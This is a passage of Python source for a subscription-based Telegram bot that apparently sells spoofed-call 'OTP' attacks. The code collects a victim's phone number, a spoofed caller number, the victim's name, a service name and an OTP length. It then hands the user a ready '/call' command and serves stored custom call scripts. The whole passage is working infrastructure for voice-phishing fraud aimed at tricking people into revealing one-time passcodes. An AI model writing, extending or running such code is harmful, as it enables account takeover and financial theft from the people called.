            error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/13')]])
            await message.answer("❌ Invalid OTP type. Please enter digits not text.",reply_markup=error)
            return
        await state.update_data(otp_digit=message.text)
        data = await state.get_data()

        # Show confirmation or proceed to spoof
        await message.answer("""✅ *Spoof Call Configured:*
    Copy this command and use it to make your first call\:

    `/call """+escape_markdown(data['victim_number'])+" "+escape_markdown(data['spoof_number'])+" "+data['victim_name']+" "+data['service_name']+" "+data['otp_digit']+"""`""", parse_mode="MarkdownV2")
        set_user_value(user_id,'In_Action','NN')
        await state.clear()


@dp.message(Command("script")) #DONE
async def script(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase"),InlineKeyboardButton(text="🛠 Support Team", url=admin_link)]])
            if check_subscription(get_user_info(user_id,'Expiry_Date')) and check_subscription(get_user_info(user_id,'Expiry_Date'))!= 'Null':
                if get_user_info(user_id,"Custom_Script") != 'N/A':
                    keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")
                    ]
                ]
                )
                    await message.answer("💬 *Your Custom Script is*\:\n"+get_user_info(user_id,"Custom_Script"),parse_mode="MarkdownV2",reply_markup=keyboard)
                else:
                    await message.answer("❌ You don't have a custom script, use /setscript to make one.")
            elif check_subscription(get_user_info(user_id,'Expiry_Date'))==False:
                await message.answer("❌ Your subscription has expired.\nTo continue using the service, please activate a new key.",reply_markup=keyboard1)
            elif get_user_info(user_id,'Expiry_Date') =='N/A':
                await message.answer("🚫 No active subscription found.\nPlease activate a key to get started.",reply_markup=keyboard1)
        elif get_user_info(user_id,'In_Action')=='FC':
            await message.answer("❌ You can't use commands while configur you first call.")
        else:
             await message.answer("❌ You can't use commands while making a custom script.")


#NON AVAILABLE COMMAND
@dp.message(lambda message: message.text and message.text.startswith('/'))
async def unknown_command(message: Message):
    user_id=message.from_user.id
    if not(get_user_info(user_id,'Banned')):
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="🛠 Support Team", url=admin_link)
                ]])
        await message.answer("⚠️ Unrecognized command. Please contact support if you need assistance.",reply_markup=keyboard)


#TEXT 
@dp.message()
async def unknown_text(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if await state.get_state() is not None:
            return  # Let FSM handle it
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="🛠 Support Team", url=admin_link)
                ]])
        await message.answer("""🤖 Sorry, I couldn’t process your request.
For further assistance, please contact our support team.""",reply_markup=keyboard)


# Run bot
async def main():
    create_users_table()
    create_keys_table()
    await dp.start_polling(bot)

while True:
    try:
        asyncio.run(main())
    except Exception as e:
        print(f"❌ Bot crashed: {e}")
        sleep(3)  # small delay before restart
